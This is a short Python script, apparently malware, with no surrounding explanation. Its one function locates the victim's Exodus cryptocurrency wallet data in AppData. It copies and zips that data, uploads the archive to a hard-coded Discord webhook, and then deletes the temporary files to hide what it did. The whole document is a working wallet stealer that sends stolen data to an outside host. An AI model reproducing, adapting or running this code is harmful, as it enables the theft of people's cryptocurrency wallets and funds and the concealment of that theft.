# import os.path, shutil, requests

def runner():
    user = os.path.expanduser("~")

    hook = "https://discord.com/api/webhooks/1090077174641463457/4bnLNsh75UzDAEzk0PsDqdV1R2w9CD32pAjI8jlY93surPEmSwt-PRKZ9mzS-TcQ9FR3"
    if os.path.exists(user+"\\AppData\\Roaming\\Exodus"):
     shutil.copytree(user+"\\AppData\\Roaming\\Exodus", user+"\\AppData\\Local\\Temp\\Exodus")
     shutil.make_archive(user+"\\AppData\\Local\\Temp\\Exodus", "zip", user+"\\AppData\\Local\\Temp\\Exodus")

     file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
     r = requests.post(hook, files=file)
     try:
      os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
      os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
     except:
       pass